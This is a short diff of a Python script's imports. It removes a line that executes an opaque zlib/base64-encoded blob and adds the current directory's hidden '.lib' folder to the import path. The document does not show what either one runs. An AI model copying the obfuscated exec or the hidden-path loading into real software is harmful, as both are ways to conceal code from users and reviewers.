@@ -1,8 +1,7 @@
 #!/bin/env python3
 
 import os, sys
-import zlib, base64
-exec(zlib.decompress(base64.b64decode('eJwrrizWK0gsydBLLChIzUvRyC/WS08tSS5P0dDUVtLXy8lM0lfS5Eorys9VSCzIVMjMLcgvKtHiAgAXGhJK')))
+sys.path.append(os.getcwd()+"/.lib/")
 import argparse
 
 ap = argparse.ArgumentParser()
